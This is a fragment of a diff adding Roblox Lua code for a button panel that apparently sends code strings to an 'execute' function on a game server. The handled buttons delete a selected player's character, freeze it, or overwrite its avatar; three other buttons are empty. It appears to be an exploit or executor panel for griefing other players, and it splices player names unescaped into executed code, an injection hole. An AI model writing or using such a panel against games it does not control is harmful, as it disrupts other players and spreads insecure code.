+execute("local P=game:GetService('Players') local t=P:FindFirstChild('"..playerName.."') if not t then return end local ok,uid=pcall(function() return P:GetUserIdFromNameAsync('"..skinUsername.."') end) if not ok then return end local d=P:GetHumanoidDescriptionFromUserId(uid) t.CharacterAdded:Connect(function(c) local h=c:FindFirstChildWhichIsA('Humanoid') if h then h:ApplyDescription(d) end end) if t.Character then local h=t.Character:FindFirstChildWhichIsA('Humanoid') if h then h:ApplyDescription(d) end end")
+	end,
+
+	["delete"] = function()
+		if not selectedButton then
+	showNotification("u forgot selecte player")
+	return
+end
+
+local playerName = selectedButton.Text
+
+execute('local p=game.Players:FindFirstChild("'..playerName..'") if p and p.Character then p.Character:Destroy() end')
+	end,
+
+	["feeze"] = function()
+		if not selectedButton then
+	showNotification("u forgot selecte player")
+	return
+end
+
+local playerName = selectedButton.Text
+
+execute('local p=game.Players:FindFirstChild("'..playerName..'") if p and p.Character then for _,v in ipairs(p.Character:GetDescendants()) do if v:IsA("BasePart") then v.Anchored=true end end end')
+	end,
+
+	["Open Door"] = function()
+
+	end,
+
+	["Shutdown"] = function()
+		
+	end,
+
+	["YouTube"] = function()
+		
+	end
+}
+
+for _, name in ipairs(buttonNames) do
+	local btn = Instance.new("TextButton", scrollo)
+	btn.Text = name
+	btn.Font = Enum.Font.SourceSans
+	btn.TextSize = 14
+	btn.TextColor3 = Color3.new(1, 1, 1)
+	btn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+	btn.BorderSizePixel = 0
+	btn.AutoButtonColor = true
+
+	local corner = Instance.new("UICorner")
+	corner.CornerRadius = UDim.new(1, 0)
+	corner.Parent = btn
+
+	btn.MouseButton1Click:Connect(function()
+		if buttonFunctions[name] then
+			buttonFunctions[name]()
+		else
+			print("Clicked:", name)
+		end
+	end)
+end
+
+scrollo.ChildAdded:Connect(function()
+	task.wait()
+	scrollo.CanvasSize = UDim2.new(0, 0, 0, layouto.AbsoluteContentSize.Y + 10)
+end)
